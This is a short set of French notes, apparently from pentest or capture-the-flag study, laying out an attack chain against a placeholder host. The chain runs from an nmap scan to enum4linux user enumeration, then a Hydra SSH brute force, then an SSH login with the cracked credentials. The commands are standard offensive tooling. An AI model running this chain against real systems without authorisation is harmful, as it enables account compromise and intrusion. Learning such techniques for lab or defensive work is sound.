# First Kill Path




L'ordre c'est :

**1. Nmap** — scanner les ports ouverts sur la cible
```bash
nmap -sV 192.168.X.X
```
Tu sais quels services tournent, quelles versions.

**2. enum4linux** — si le port 445 est ouvert
```bash
enum4linux 192.168.X.X
```
Tu récupères users, partages, politique de mots de passe.

**3. Hydra** — avec la liste d'users récupérée
```bash
hydra -L users.txt -P wordlist.txt ssh://192.168.X.X
```
=> on peut rajouter `-T 4` et `--open`pour aller plus vite.

Tu tentes de trouver un mot de passe valide.

**4. SSH** — avec les credentials trouvés
```bash
ssh user@192.168.X.X
```
T'es dans la machine.

---

